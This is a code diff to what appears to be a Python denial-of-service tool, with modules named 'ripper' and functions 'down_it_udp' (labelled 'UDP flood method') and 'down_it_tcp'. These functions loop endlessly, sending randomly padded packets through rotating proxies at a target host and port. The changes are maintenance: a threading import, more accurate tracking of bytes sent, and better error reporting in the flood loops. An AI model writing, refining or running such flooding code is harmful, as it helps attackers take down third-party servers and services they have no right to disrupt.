@@ -1,4 +1,5 @@
 import socket
+import threading
 from os import urandom as randbytes
 from socks import ProxyError
 
@@ -12,7 +13,7 @@ from ripper.urllib_x import build_request_http_package, http_request
 # Common methods for attacks
 ###############################################
 # TODO add support for http_method, http_path
-def build_ctx_request_http_package(_ctx: Context) -> str:
+def build_ctx_request_http_package(_ctx: Context) -> bytes:
     extra_data = ''
     if _ctx.max_random_packet_len > 0:
         extra_data = get_random_string(1, _ctx.max_random_packet_len)
@@ -30,13 +31,14 @@ def down_it_udp(_ctx: Context) -> None:
     """UDP flood method."""
     i = 1
     proxy = None
+    target = (_ctx.host_ip, _ctx.port)
     while True:
         proxy = _ctx.proxy_manager.get_random_proxy()
         sock = _ctx.sock_manager.get_udp_socket(proxy)
         request_packet = build_ctx_request_http_package(_ctx)
 
         try:
-            sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
+            sent = sock.sendto(request_packet, target)
         except socket.gaierror:
             _ctx.add_error(Errors(ErrorCodes.CannotGetServerIP.value, GETTING_SERVER_IP_ERROR_MSG))
         except Exception as e:
@@ -46,7 +48,7 @@ def down_it_udp(_ctx: Context) -> None:
         else:
             _ctx.Statistic.packets.total_sent += 1
             _ctx.Statistic.packets.sync_packets_sent()
-            _ctx.Statistic.packets.total_sent_bytes += len(request_packet)
+            _ctx.Statistic.packets.total_sent_bytes += sent
             _ctx.remove_error(ErrorCodes.CannotGetServerIP.value)
             proxy.report_success() if proxy is not None else 0
 
@@ -108,7 +110,8 @@ def down_it_tcp(_ctx: Context) -> None:
                     sock.close()
                     break
                 # successful try (sock.send)
-                except:
+                except Exception as e:
+                    _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
                     _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
                     _ctx.Statistic.connect.failed += 1
                     sock.close()
